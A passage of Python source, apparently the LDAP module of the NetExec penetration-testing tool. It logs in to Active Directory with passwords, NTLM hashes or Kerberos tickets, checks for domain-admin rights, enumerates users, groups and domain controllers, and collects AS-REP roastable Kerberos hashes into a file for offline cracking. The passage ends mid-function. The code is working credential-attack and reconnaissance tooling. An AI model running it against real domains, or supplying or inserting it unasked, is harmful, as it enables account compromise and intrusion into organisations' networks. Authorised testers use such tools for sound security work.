# from https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
# https://troopers.de/downloads/troopers19/TROOPERS19_AD_Fun_With_LDAP.pdf
import hashlib
import hmac
import os
from binascii import hexlify
from datetime import datetime, timedelta
from re import sub, I
from zipfile import ZipFile
from termcolor import colored
from dns import resolver

from Cryptodome.Hash import MD4
from OpenSSL.SSL import SysCallError
from bloodhound.ad.authentication import ADAuthentication
from bloodhound.ad.domain import AD
from impacket.dcerpc.v5.samr import (
    UF_ACCOUNTDISABLE,
    UF_DONT_REQUIRE_PREAUTH,
    UF_TRUSTED_FOR_DELEGATION,
    UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION,
    UF_SERVER_TRUST_ACCOUNT,
)
from impacket.krb5 import constants
from impacket.krb5.kerberosv5 import getKerberosTGS, SessionKeyDecryptionError
from impacket.krb5.types import Principal, KerberosException
from impacket.ldap import ldap as ldap_impacket
from impacket.ldap import ldaptypes
from impacket.ldap import ldapasn1 as ldapasn1_impacket
from impacket.ldap.ldap import LDAPFilterSyntaxError
from impacket.smbconnection import SessionError
from impacket.ntlm import getNTLMSSPType1

from nxc.config import process_secret, host_info_colors
from nxc.connection import connection
from nxc.helpers.bloodhound import add_user_bh
from nxc.logger import NXCAdapter, nxc_logger
from nxc.protocols.ldap.bloodhound import BloodHound
from nxc.protocols.ldap.gmsa import MSDS_MANAGEDPASSWORD_BLOB
from nxc.protocols.ldap.kerberos import KerberosAttacks
from nxc.parsers.ldap_results import parse_result_attributes
from nxc.helpers.ntlm_parser import parse_challenge

ldap_error_status = {
    "1": "STATUS_NOT_SUPPORTED",
    "533": "STATUS_ACCOUNT_DISABLED",
    "701": "STATUS_ACCOUNT_EXPIRED",
    "531": "STATUS_ACCOUNT_RESTRICTION",
    "530": "STATUS_INVALID_LOGON_HOURS",
    "532": "STATUS_PASSWORD_EXPIRED",
    "773": "STATUS_PASSWORD_MUST_CHANGE",
    "775": "USER_ACCOUNT_LOCKED",
    "50": "LDAP_INSUFFICIENT_ACCESS",
    "0": "LDAP Signing IS Enforced",
    "KDC_ERR_CLIENT_REVOKED": "KDC_ERR_CLIENT_REVOKED",
    "KDC_ERR_PREAUTH_FAILED": "KDC_ERR_PREAUTH_FAILED",
}


def resolve_collection_methods(methods):
    """Convert methods (string) to list of validated methods to resolve"""
    valid_methods = [
        "group",
        "localadmin",
        "session",
        "trusts",
        "default",
        "all",
        "loggedon",
        "objectprops",
        "experimental",
        "acl",
        "dcom",
        "rdp",
        "psremote",
        "dconly",
        "container",
    ]
    default_methods = ["group", "localadmin", "session", "trusts"]
    # Similar to SharpHound, All is not really all, it excludes loggedon
    all_methods = [
        "group",
        "localadmin",
        "session",
        "trusts",
        "objectprops",
        "acl",
        "dcom",
        "rdp",
        "psremote",
        "container",
    ]
    # DC only, does not collect to computers
    dconly_methods = ["group", "trusts", "objectprops", "acl", "container"]
    if "," in methods:
        method_list = [method.lower() for method in methods.split(",")]
        validated_methods = []
        for method in method_list:
            if method not in valid_methods:
                nxc_logger.error("Invalid collection method specified: %s", method)
                return False

            if method == "default":
                validated_methods += default_methods
            elif method == "all":
                validated_methods += all_methods
            elif method == "dconly":
                validated_methods += dconly_methods
            else:
                validated_methods.append(method)
        return set(validated_methods)
    else:
        validated_methods = []
        # It is only one
        method = methods.lower()
        if method in valid_methods:
            if method == "default":
                validated_methods += default_methods
            elif method == "all":
                validated_methods += all_methods
            elif method == "dconly":
                validated_methods += dconly_methods
            else:
                validated_methods.append(method)
            return set(validated_methods)
        else:
            nxc_logger.error("Invalid collection method specified: %s", method)
            return False


class ldap(connection):
    def __init__(self, args, db, host):
        self.domain = None
        self.server_os = None
        self.os_arch = 0
        self.hash = None
        self.ldap_connection = None
        self.lmhash = ""
        self.nthash = ""
        self.baseDN = ""
        self.target = ""
        self.targetDomain = ""
        self.remote_ops = None
        self.bootkey = None
        self.output_filename = None
        self.smbv1 = None
        self.signing = False
        self.admin_privs = False
        self.no_ntlm = False
        self.sid_domain = ""

        connection.__init__(self, args, db, host)

    def proto_logger(self):
        self.logger = NXCAdapter(
            extra={
                "protocol": "LDAP",
                "host": self.host,
                "port": self.port,
                "hostname": self.hostname,
            }
        )

    def create_conn_obj(self):
        try:
            proto = "ldaps" if (self.args.gmsa or self.port == 636) else "ldap"
            ldap_url = f"{proto}://{self.host}"
            self.logger.info(f"Connecting to {ldap_url} with no baseDN")
            try:
                self.ldap_connection = ldap_impacket.LDAPConnection(ldap_url, dstIp=self.host)
                if self.ldap_connection:
                    self.logger.debug(f"ldap_connection: {self.ldap_connection}")
            except SysCallError as e:
                if proto == "ldaps":
                    self.logger.fail(f"LDAPs connection to {ldap_url} failed - {e}")
                    # https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-ldap-over-ssl-3rd-certification-authority
                    self.logger.fail("Even if the port is open, LDAPS may not be configured")
                else:
                    self.logger.fail(f"LDAP connection to {ldap_url} failed: {e}")
                return False

            resp = self.ldap_connection.search(
                scope=ldapasn1_impacket.Scope("baseObject"),
                attributes=["defaultNamingContext", "dnsHostName"],
                sizeLimit=0,
            )
            resp_parse = parse_result_attributes(resp)

            target = None
            target_domain = None
            base_dn = None
            try:
                for attribute in resp_parse:
                    base_dn = attribute.get("defaultNamingContext")
                    if base_dn:
                        base_dn = str(base_dn)
                        target_domain = sub(r",DC=", ".", base_dn[base_dn.lower().find("dc="):], flags=I)[3:]

                    target = attribute.get("dnsHostName")
                    if target:
                        target = str(target)
            except Exception as e:
                self.logger.debug("Exception:", exc_info=True)
                self.logger.info(f"Skipping item, cannot process due to error {e}")
        except OSError:
            return False
        self.logger.debug(f"Target: {target}; target_domain: {target_domain}; base_dn: {base_dn}")
        self.target = target
        self.targetDomain = target_domain
        self.baseDN = base_dn
        return True

    def get_ldap_username(self):
        extended_request = ldapasn1_impacket.ExtendedRequest()
        extended_request["requestName"] = "1.3.6.1.4.1.4203.1.11.3"  # whoami

        response = self.ldap_connection.sendReceive(extended_request)
        for message in response:
            search_result = message["protocolOp"].getComponent()
            if search_result["resultCode"] == ldapasn1_impacket.ResultCode("success"):
                response_value = search_result["responseValue"]
                if response_value.hasValue():
                    value = response_value.asOctets().decode(response_value.encoding)[2:]
                    return value.split("\\")[1]
        return ""

    def enum_host_info(self):
        self.baseDN = self.args.base_dn if self.args.base_dn else self.baseDN   # Allow overwriting baseDN from args
        self.hostname = self.target.split(".")[0].upper()
        self.remoteName = self.target
        self.domain = self.targetDomain

        ntlm_challenge = None
        bindRequest = ldapasn1_impacket.BindRequest()
        bindRequest["version"] = 3
        bindRequest["name"] = ""
        negotiate = getNTLMSSPType1()
        bindRequest["authentication"]["sicilyNegotiate"] = negotiate.getData()
        try:
            response = self.ldap_connection.sendReceive(bindRequest)[0]["protocolOp"]
            ntlm_challenge = bytes(response["bindResponse"]["matchedDN"])
        except Exception as e:
            self.logger.debug(f"Failed to get target {self.host} ntlm challenge, error: {e!s}")

        if ntlm_challenge:
            ntlm_info = parse_challenge(ntlm_challenge)
            self.server_os = ntlm_info["os_version"]

        if not self.kdcHost and self.domain and self.domain == self.remoteName:
            result = self.resolver(self.domain)
            self.kdcHost = result["host"] if result else None
            self.logger.info(f"Resolved domain: {self.domain} with dns, kdcHost: {self.kdcHost}")

        self.output_filename = os.path.expanduser(f"~/.nxc/logs/{self.hostname}_{self.host}".replace(":", "-"))

    def print_host_info(self):
        self.logger.debug("Printing host info for LDAP")
        self.logger.extra["protocol"] = "LDAP" if str(self.port) == "389" else "LDAPS"
        self.logger.extra["port"] = self.port
        self.logger.extra["hostname"] = self.hostname
        self.logger.display(f"{self.server_os} (name:{self.hostname}) (domain:{self.domain})")

    def kerberos_login(self, domain, username, password="", ntlm_hash="", aesKey="", kdcHost="", useCache=False):
        self.username = username
        self.password = password
        self.domain = domain
        self.kdcHost = kdcHost
        self.aesKey = aesKey

        lmhash = ""
        nthash = ""
        self.username = username
        # This checks to see if we didn't provide the LM Hash
        if ntlm_hash.find(":") != -1:
            lmhash, nthash = ntlm_hash.split(":")
            self.hash = nthash
        else:
            nthash = ntlm_hash
            self.hash = ntlm_hash
        if lmhash:
            self.lmhash = lmhash
        if nthash:
            self.nthash = nthash

        if self.password == "" and self.args.asreproast:
            hash_tgt = KerberosAttacks(self).get_tgt_asroast(self.username)
            if hash_tgt:
                self.logger.highlight(f"{hash_tgt}")
                with open(self.args.asreproast, "a+") as hash_asreproast:
                    hash_asreproast.write(f"{hash_tgt}\n")
            return False

        kerb_pass = next(s for s in [self.nthash, password, aesKey] if s) if not all(s == "" for s in [self.nthash, password, aesKey]) else ""

        try:
            # Connect to LDAP
            self.logger.extra["protocol"] = "LDAPS" if (self.args.gmsa or self.port == 636) else "LDAP"
            self.logger.extra["port"] = "636" if (self.args.gmsa or self.port == 636) else "389"
            proto = "ldaps" if (self.args.gmsa or self.port == 636) else "ldap"
            ldap_url = f"{proto}://{self.target}"
            self.logger.info(f"Connecting to {ldap_url} - {self.baseDN} - {self.host} [1]")
            self.ldap_connection = ldap_impacket.LDAPConnection(url=ldap_url, baseDN=self.baseDN, dstIp=self.host)
            self.ldap_connection.kerberosLogin(username, password, domain, self.lmhash, self.nthash, aesKey, kdcHost=kdcHost, useCache=useCache)
            if self.username == "":
                self.username = self.get_ldap_username()

            self.check_if_admin()

            used_ccache = " from ccache" if useCache else f":{process_secret(kerb_pass)}"
            self.logger.success(f"{domain}\\{self.username}{used_ccache} {self.mark_pwned()}")

            if not self.args.local_auth and self.username != "":
                add_user_bh(self.username, self.domain, self.logger, self.config)
            if self.admin_privs:
                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
            return True
        except SessionKeyDecryptionError:
            # for PRE-AUTH account
            self.logger.success(
                f"{domain}\\{self.username}{' account vulnerable to asreproast attack'} {''}",
                color="yellow",
            )
            return False
        except SessionError as e:
            error, desc = e.getErrorString()
            used_ccache = " from ccache" if useCache else f":{process_secret(kerb_pass)}"
            self.logger.fail(
                f"{self.domain}\\{self.username}{used_ccache} {error!s}",
                color="magenta" if error in ldap_error_status else "red",
            )
            return False
        except (KeyError, KerberosException, OSError) as e:
            self.logger.fail(
                f"{self.domain}\\{self.username}{' from ccache' if useCache else ':%s' % (process_secret(kerb_pass))} {e!s}",
                color="red",
            )
            return False
        except ldap_impacket.LDAPSessionError as e:
            if str(e).find("strongerAuthRequired") >= 0:
                # We need to try SSL
                try:
                    # Connect to LDAPS
                    self.logger.extra["protocol"] = "LDAPS"
                    self.logger.extra["port"] = "636"
                    ldaps_url = f"ldaps://{self.target}"
                    self.logger.info(f"Connecting to {ldaps_url} - {self.baseDN} - {self.host} [2]")
                    self.ldap_connection = ldap_impacket.LDAPConnection(url=ldaps_url, baseDN=self.baseDN, dstIp=self.host)
                    self.ldap_connection.kerberosLogin(username, password, domain, self.lmhash, self.nthash, aesKey, kdcHost=kdcHost, useCache=useCache)
                    if self.username == "":
                        self.username = self.get_ldap_username()

                    self.check_if_admin()

                    # Prepare success credential text
                    self.logger.success(f"{domain}\\{self.username} {self.mark_pwned()}")

                    if not self.args.local_auth and self.username != "":
                        add_user_bh(self.username, self.domain, self.logger, self.config)
                    if self.admin_privs:
                        add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
                    return True
                except SessionError as e:
                    error, desc = e.getErrorString()
                    self.logger.fail(
                        f"{self.domain}\\{self.username}{' from ccache' if useCache else ':%s' % (process_secret(kerb_pass))} {error!s}",
                        color="magenta" if error in ldap_error_status else "red",
                    )
                    return False
                except Exception as e:
                    error_code = str(e).split()[-2][:-1]
                    self.logger.fail(
                        f"{self.domain}\\{self.username}:{process_secret(self.password)} {ldap_error_status[error_code] if error_code in ldap_error_status else ''}",
                        color="magenta" if error_code in ldap_error_status else "red",
                    )
                    return False
            else:
                error_code = str(e).split()[-2][:-1]
                self.logger.fail(
                    f"{self.domain}\\{self.username}{' from ccache' if useCache else ':%s' % (process_secret(kerb_pass))} {error_code!s}",
                    color="magenta" if error_code in ldap_error_status else "red",
                )
                return False

    def plaintext_login(self, domain, username, password):
        self.username = username
        self.password = password
        self.domain = domain

        if self.password == "" and self.args.asreproast:
            hash_tgt = KerberosAttacks(self).get_tgt_asroast(self.username)
            if hash_tgt:
                self.logger.highlight(f"{hash_tgt}")
                with open(self.args.asreproast, "a+") as hash_asreproast:
                    hash_asreproast.write(f"{hash_tgt}\n")
            return False

        try:
            # Connect to LDAP
            self.logger.extra["protocol"] = "LDAPS" if (self.args.gmsa or self.port == 636) else "LDAP"
            self.logger.extra["port"] = "636" if (self.args.gmsa or self.port == 636) else "389"
            proto = "ldaps" if (self.args.gmsa or self.port == 636) else "ldap"
            ldap_url = f"{proto}://{self.target}"
            self.logger.info(f"Connecting to {ldap_url} - {self.baseDN} - {self.host} [3]")
            self.ldap_connection = ldap_impacket.LDAPConnection(url=ldap_url, baseDN=self.baseDN, dstIp=self.host)
            self.ldap_connection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
            self.check_if_admin()

            # Prepare success credential text
            self.logger.success(f"{domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}")

            if not self.args.local_auth and self.username != "":
                add_user_bh(self.username, self.domain, self.logger, self.config)
            if self.admin_privs:
                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
            return True
        except ldap_impacket.LDAPSessionError as e:
            if str(e).find("strongerAuthRequired") >= 0:
                # We need to try SSL
                try:
                    # Connect to LDAPS
                    self.logger.extra["protocol"] = "LDAPS"
                    self.logger.extra["port"] = "636"
                    ldaps_url = f"ldaps://{self.target}"
                    self.logger.info(f"Connecting to {ldaps_url} - {self.baseDN} - {self.host} [4]")
                    self.ldap_connection = ldap_impacket.LDAPConnection(url=ldaps_url, baseDN=self.baseDN, dstIp=self.host)
                    self.ldap_connection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
                    self.check_if_admin()

                    # Prepare success credential text
                    self.logger.success(f"{domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}")

                    if not self.args.local_auth and self.username != "":
                        add_user_bh(self.username, self.domain, self.logger, self.config)
                    if self.admin_privs:
                        add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
                    return True
                except Exception as e:
                    error_code = str(e).split()[-2][:-1]
                    self.logger.fail(
                        f"{self.domain}\\{self.username}:{process_secret(self.password)} {ldap_error_status[error_code] if error_code in ldap_error_status else ''}",
                        color="magenta" if (error_code in ldap_error_status and error_code != 1) else "red",
                    )
            else:
                error_code = str(e).split()[-2][:-1]
                self.logger.fail(
                    f"{self.domain}\\{self.username}:{process_secret(self.password)} {ldap_error_status[error_code] if error_code in ldap_error_status else ''}",
                    color="magenta" if (error_code in ldap_error_status and error_code != 1) else "red",
                )
            return False
        except OSError as e:
            self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.password)} {'Error connecting to the domain, are you sure LDAP service is running on the target?'} \nError: {e}")
            return False

    def hash_login(self, domain, username, ntlm_hash):
        self.logger.extra["protocol"] = "LDAP"
        self.logger.extra["port"] = "389"
        lmhash = ""
        nthash = ""

        # This checks to see if we didn't provide the LM Hash
        if ntlm_hash.find(":") != -1:
            lmhash, nthash = ntlm_hash.split(":")
        else:
            nthash = ntlm_hash

        self.hash = ntlm_hash
        if lmhash:
            self.lmhash = lmhash
        if nthash:
            self.nthash = nthash

        self.username = username
        self.domain = domain

        if self.hash == "" and self.args.asreproast:
            hash_tgt = KerberosAttacks(self).get_tgt_asroast(self.username)
            if hash_tgt:
                self.logger.highlight(f"{hash_tgt}")
                with open(self.args.asreproast, "a+") as hash_asreproast:
                    hash_asreproast.write(f"{hash_tgt}\n")
            return False

        try:
            # Connect to LDAP
            self.logger.extra["protocol"] = "LDAPS" if (self.args.gmsa or self.port == 636) else "LDAP"
            self.logger.extra["port"] = "636" if (self.args.gmsa or self.port == 636) else "389"
            proto = "ldaps" if (self.args.gmsa or self.port == 636) else "ldap"
            ldaps_url = f"{proto}://{self.target}"
            self.logger.info(f"Connecting to {ldaps_url} - {self.baseDN} - {self.host}")
            self.ldap_connection = ldap_impacket.LDAPConnection(url=ldaps_url, baseDN=self.baseDN, dstIp=self.host)
            self.ldap_connection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
            self.check_if_admin()

            # Prepare success credential text
            out = f"{domain}\\{self.username}:{process_secret(self.nthash)} {self.mark_pwned()}"
            self.logger.success(out)

            if not self.args.local_auth and self.username != "":
                add_user_bh(self.username, self.domain, self.logger, self.config)
            if self.admin_privs:
                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
            return True
        except ldap_impacket.LDAPSessionError as e:
            if str(e).find("strongerAuthRequired") >= 0:
                try:
                    # We need to try SSL
                    self.logger.extra["protocol"] = "LDAPS"
                    self.logger.extra["port"] = "636"
                    ldaps_url = f"{proto}://{self.target}"
                    self.logger.info(f"Connecting to {ldaps_url} - {self.baseDN} - {self.host}")
                    self.ldap_connection = ldap_impacket.LDAPConnection(url=ldaps_url, baseDN=self.baseDN, dstIp=self.host)
                    self.ldap_connection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
                    self.check_if_admin()

                    # Prepare success credential text
                    out = f"{domain}\\{self.username}:{process_secret(self.nthash)} {self.mark_pwned()}"
                    self.logger.success(out)

                    if not self.args.local_auth and self.username != "":
                        add_user_bh(self.username, self.domain, self.logger, self.config)
                    if self.admin_privs:
                        add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
                    return True
                except ldap_impacket.LDAPSessionError as e:
                    error_code = str(e).split()[-2][:-1]
                    self.logger.fail(
                        f"{self.domain}\\{self.username}:{process_secret(nthash)} {ldap_error_status[error_code] if error_code in ldap_error_status else ''}",
                        color="magenta" if (error_code in ldap_error_status and error_code != 1) else "red",
                    )
            else:
                error_code = str(e).split()[-2][:-1]
                self.logger.fail(
                    f"{self.domain}\\{self.username}:{process_secret(nthash)} {ldap_error_status[error_code] if error_code in ldap_error_status else ''}",
                    color="magenta" if (error_code in ldap_error_status and error_code != 1) else "red",
                )
            return False
        except OSError as e:
            self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.password)} {'Error connecting to the domain, are you sure LDAP service is running on the target?'} \nError: {e}")
            return False

    def get_sid(self):
        self.logger.highlight(f"Domain SID {self.sid_domain}")

    def sid_to_str(self, sid):
        try:
            # revision
            revision = int(sid[0])
            # count of sub authorities
            sub_authorities = int(sid[1])
            # big endian
            identifier_authority = int.from_bytes(sid[2:8], byteorder="big")
            # If true then it is represented in hex
            if identifier_authority >= 2**32:
                identifier_authority = hex(identifier_authority)

            # loop over the count of small endians
            sub_authority = "-" + "-".join([str(int.from_bytes(sid[8 + (i * 4): 12 + (i * 4)], byteorder="little")) for i in range(sub_authorities)])
            return "S-" + str(revision) + "-" + str(identifier_authority) + sub_authority
        except Exception:
            pass
        return sid

    def check_if_admin(self):
        # 1. get SID of the domaine
        search_filter = "(userAccountControl:1.2.840.113556.1.4.803:=8192)"
        attributes = ["objectSid"]
        resp = self.search(search_filter, attributes, sizeLimit=0)
        resp_parse = parse_result_attributes(resp)
        answers = []
        if resp and (self.password != "" or self.lmhash != "" or self.nthash != "") and self.username != "":

            for item in resp_parse:
                sid = item.get("objectSid").encode("latin1")
                sid = self.sid_to_str(sid)
                self.sid_domain = "-".join(sid.split("-")[:-1])

            # 2. get all group cn name
            search_filter = "(|(objectSid=" + self.sid_domain + "-512)(objectSid=" + self.sid_domain + "-544)(objectSid=" + self.sid_domain + "-519)(objectSid=S-1-5-32-549)(objectSid=S-1-5-32-551))"
            attributes = ["distinguishedName"]
            resp = self.search(search_filter, attributes, sizeLimit=0)
            resp_parse = parse_result_attributes(resp)
            answers = []

            for item in resp_parse:
                answers.append(str("(memberOf:1.2.840.113556.1.4.1941:=" + item.get("distinguishedName") + ")"))

            # 3. get member of these groups
            search_filter = "(&(objectCategory=user)(sAMAccountName=" + self.username + ")(|" + "".join(answers) + "))"
            attributes = [""]
            resp = self.search(search_filter, attributes, sizeLimit=0)
            answers = []
            resp_parse = parse_result_attributes(resp)
            
            for item in resp_parse:
                if item:
                    self.admin_privs = True

    def getUnixTime(self, t):
        t -= 116444736000000000
        t /= 10000000
        return t

    def search(self, searchFilter, attributes, sizeLimit=0) -> list:
        try:
            if self.ldap_connection:
                self.logger.debug(f"Search Filter={searchFilter}")

                # Microsoft Active Directory set an hard limit of 1000 entries returned by any search
                paged_search_control = ldapasn1_impacket.SimplePagedResultsControl(criticality=True, size=1000)
                return self.ldap_connection.search(
                    searchBase=self.baseDN,
                    searchFilter=searchFilter,
                    attributes=attributes,
                    sizeLimit=sizeLimit,
                    searchControls=[paged_search_control],
                )
        except ldap_impacket.LDAPSearchError as e:
            if e.getErrorString().find("sizeLimitExceeded") >= 0:
                # We should never reach this code as we use paged search now
                self.logger.fail("sizeLimitExceeded exception caught, giving up and processing the data received")
                e.getAnswers()
            else:
                self.logger.fail(e)
                return []
        return []

    def users(self):
        """
        Retrieves user information from the LDAP server.

        Args:
        ----
            input_attributes (list): Optional. List of attributes to retrieve for each user.

        Returns:
        -------
            None
        """
        if len(self.args.users) > 0:
            self.logger.debug(f"Dumping users: {', '.join(self.args.users)}")
            search_filter = f"(|{''.join(f'(sAMAccountName={user})' for user in self.args.users)})"
        else:
            self.logger.debug("Trying to dump all users")
            search_filter = "(sAMAccountType=805306368)" if self.username != "" else "(objectclass=*)"

        # default to these attributes to mirror the SMB --users functionality
        request_attributes = ["sAMAccountName", "description", "badPwdCount", "pwdLastSet"]
        resp = self.search(search_filter, request_attributes, sizeLimit=0)

        if resp:
            # I think this was here for anonymous ldap bindings, so I kept it, but we might just want to remove it
            if self.username == "":
                self.logger.display(f"Total records returned: {len(resp):d}")
                for item in resp:
                    if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                        continue
                    self.logger.highlight(f"{item['objectName']}")
                return

            users = parse_result_attributes(resp)
            # we print the total records after we parse the results since often SearchResultReferences are returned
            self.logger.display(f"Enumerated {len(users):d} domain users: {self.domain}")
            self.logger.highlight(f"{'-Username-':<30}{'-Last PW Set-':<20}{'-BadPW-':<8}{'-Description-':<60}")
            for user in users:
                # TODO: functionize this - we do this calculation in a bunch of places, different, including in the `pso` module
                parsed_pw_last_set = ""
                pwd_last_set = user.get("pwdLastSet", "")
                if pwd_last_set != "":
                    timestamp_seconds = int(pwd_last_set) / 10**7
                    start_date = datetime(1601, 1, 1)
                    parsed_pw_last_set = (start_date + timedelta(seconds=timestamp_seconds)).replace(microsecond=0).strftime("%Y-%m-%d %H:%M:%S")
                    if parsed_pw_last_set == "1601-01-01 00:00:00":
                        parsed_pw_last_set = "<never>"
                # we default attributes to blank strings if they don't exist in the dict
                self.logger.highlight(f"{user.get('sAMAccountName', ''):<30}{parsed_pw_last_set:<20}{user.get('badPwdCount', ''):<8}{user.get('description', ''):<60}")

    def groups(self):
        # Building the search filter
        search_filter = "(objectCategory=group)"
        attributes = ["name"]
        resp = self.search(search_filter, attributes, 0)
        resp_parse = parse_result_attributes(resp)
        if resp:
            self.logger.debug(f"Total of records returned {len(resp):d}")

            for item in resp_parse:
                name = ""
                try:
                    name = item.get("name")
                    self.logger.highlight(f"{name}")
                except Exception as e:
                    self.logger.debug("Exception:", exc_info=True)
                    self.logger.debug(f"Skipping item, cannot process due to error {e}")
            return

    def dc_list(self):
        # Building the search filter
        resolv = resolver.Resolver()
        if self.args.dns_server:
            resolv.nameservers = [self.args.dns_server]
        else:
            resolv.nameservers = [self.host]
        resolv.timeout = self.args.dns_timeout

        search_filter = "(&(objectCategory=computer)(primaryGroupId=516))"
        attributes = ["dNSHostName"]
        resp = self.search(search_filter, attributes, 0)
        resp_parse = parse_result_attributes(resp)

        for item in resp_parse:
            name = item.get("dNSHostName", "")  # Get dNSHostName attribute or empty string
            try:
                # Resolve using DNS server for A, AAAA, CNAME, PTR, and NS records
                if name:
                    found_record = False  # Flag to check if any record is found

                    for record_type in ["A", "AAAA", "CNAME", "PTR", "NS"]:
                        if found_record:
                            break  # If a record has been found, stop checking further
                        
                        try:
                            answers = resolv.resolve(name, record_type, tcp=self.args.dns_tcp)
                            for rdata in answers:
                                if record_type in ["A", "AAAA"]:
                                    ip_address = rdata.to_text()
                                    self.logger.highlight(f"{name} = {colored(ip_address, host_info_colors[0])}")
                                    found_record = True  # Set flag to true since a record is found
                                elif record_type == "CNAME":
                                    self.logger.highlight(f"{name} CNAME = {colored(rdata.to_text(), host_info_colors[0])}")
                                    found_record = True
                                elif record_type == "PTR":
                                    self.logger.highlight(f"{name} PTR = {colored(rdata.to_text(), host_info_colors[0])}")
                                    found_record = True
                                elif record_type == "NS":
                                    self.logger.highlight(f"{name} NS = {colored(rdata.to_text(), host_info_colors[0])}")
                                    found_record = True
                        except resolv.NXDOMAIN:
                            self.logger.fail(f"{name} = Host not found (NXDOMAIN)")
                        except resolv.Timeout:
                            self.logger.fail(f"{name} = Connection timed out")
                        except resolv.NoAnswer:
                            self.logger.fail(f"{name} = DNS server did not respond")
                        except Exception as e:
                            self.logger.fail(f"{name} encountered an unexpected error: {e}")
                else:
                    self.logger.fail("dNSHostName value is empty, unable to process.")
            except Exception as e:
                self.logger.fail("General Error:", exc_info=True)
                self.logger.fail(f"Skipping item(dNSHostName) {name}, error: {e}")

    def active_users(self):
        if len(self.args.active_users) > 0:
            arg = True
            self.logger.debug(f"Dumping users: {', '.join(self.args.active_users)}")
            search_filter = "(sAMAccountType=805306368)" if self.username != "" else "(objectclass=*)"
            search_filter_args = f"(|{''.join(f'(sAMAccountName={user})' for user in self.args.active_users)})"
        else:
            arg = False
            self.logger.debug("Trying to dump all users")
            search_filter = "(sAMAccountType=805306368)" if self.username != "" else "(objectclass=*)"

        # default to these attributes to mirror the SMB --users functionality
        request_attributes = ["sAMAccountName", "description", "badPwdCount", "pwdLastSet", "userAccountControl"]
        resp = self.search(search_filter, request_attributes, sizeLimit=0)
        allusers = parse_result_attributes(resp)

        count = 0
        activeusers = []
        argsusers = []

        if arg:
            resp_args = self.search(search_filter_args, request_attributes, sizeLimit=0)
            users_args = parse_result_attributes(resp_args)
            # This try except for, if user gives a doesn't exist username. If it does, parsing process is crashing
            for i in range(len(self.args.active_users)):
                try:
                    argsusers.append(users_args[i])
                except Exception as e:
                    self.logger.debug("Exception:", exc_info=True)
                    self.logger.debug(f"Skipping item, cannot process due to error {e}")
        else:
            argsusers = allusers

        for user in allusers:
            user_account_control = user.get("userAccountControl")
            if user_account_control is not None:  # Check if user_account_control is not None
                account_control = "".join(user_account_control) if isinstance(user_account_control, list) else user_account_control  # If it's already a list
                account_disabled = int(account_control) & 2
                if not account_disabled:
                    count += 1
                    activeusers.append(user.get("sAMAccountName").lower())
            else:
                self.logger.debug(f"userAccountControl for user {user.get('sAMAccountName')} is None")

        if self.username == "":
            self.logger.display(f"Total records returned: {len(resp):d}")
            for item in resp_args:
                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                    continue
                self.logger.highlight(f"{item['objectName']}")
            return
        self.logger.display(f"Total records returned: {count}, total {len(allusers) - count:d} user(s) disabled") if not arg else self.logger.display(f"Total records returned: {len(argsusers)}, Total {len(allusers) - count:d} user(s) disabled")
        self.logger.highlight(f"{'-Username-':<30}{'-Last PW Set-':<20}{'-BadPW-':<8}{'-Description-':<60}")

        for arguser in argsusers:
            pwd_last_set = arguser.get("pwdLastSet", "")  # Retrieves pwdLastSet directly and defaults to an empty string.
            if pwd_last_set:  # Checks if pwdLastSet is empty or not.
                timestamp_seconds = int(pwd_last_set) / 10**7  # Converts pwdLastSet to an integer.
                start_date = datetime(1601, 1, 1)
                parsed_pw_last_set = (start_date + timedelta(seconds=timestamp_seconds)).replace(microsecond=0).strftime("%Y-%m-%d %H:%M:%S")
                if parsed_pw_last_set == "1601-01-01 00:00:00":
                    parsed_pw_last_set = "<never>"

            if arguser.get("sAMAccountName").lower() in activeusers and arg is False:
                self.logger.highlight(f"{arguser.get('sAMAccountName', ''):<30}{parsed_pw_last_set:<20}{arguser.get('badPwdCount', ''):<8}{arguser.get('description', ''):<60}")
            elif (arguser.get("sAMAccountName").lower() not in activeusers) and arg is True:
                self.logger.highlight(f"{arguser.get('sAMAccountName', '') + ' (Disabled)':<30}{parsed_pw_last_set:<20}{arguser.get('badPwdCount', ''):<8}{arguser.get('description', ''):<60}")
            elif (arguser.get("sAMAccountName").lower() in activeusers):
                self.logger.highlight(f"{arguser.get('sAMAccountName', ''):<30}{parsed_pw_last_set:<20}{arguser.get('badPwdCount', ''):<8}{arguser.get('description', ''):<60}")

    def asreproast(self):
        if self.password == "" and self.nthash == "" and self.kerberos is False:
            return False
        # Building the search filter
        search_filter = "(&(UserAccountControl:1.2.840.113556.1.4.803:=%d)(!(UserAccountControl:1.2.840.113556.1.4.803:=%d))(!(objectCategory=computer)))" % (UF_DONT_REQUIRE_PREAUTH, UF_ACCOUNTDISABLE)
        attributes = [
            "sAMAccountName",
            "pwdLastSet",
            "MemberOf",
            "userAccountControl",
            "lastLogon",
        ]
        resp = self.search(search_filter, attributes, 0)
        resp_parse = parse_result_attributes(resp)
        if resp is None:
            self.logger.highlight("No entries found!")
        elif resp:
            answers = []
            self.logger.display(f"Total of records returned {len(resp):d}")

            for item in resp_parse:
                mustCommit = False
                sAMAccountName = ""
                memberOf = ""
                pwdLastSet = ""
                userAccountControl = 0
                lastLogon = "N/A"
                try:
                    sAMAccountName = item.get("sAMAccountName", "")
                    mustCommit = sAMAccountName is not None
                    userAccountControl = "0x%x" % int(item.get("userAccountControl", 0))
                    memberOf = str(item.get("memberOf", " "))
                    pwdLastSet = "<never>" if str(item.get("pwdLastSet", 0)) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(str(item.get("pwdLastSet", 0))))))
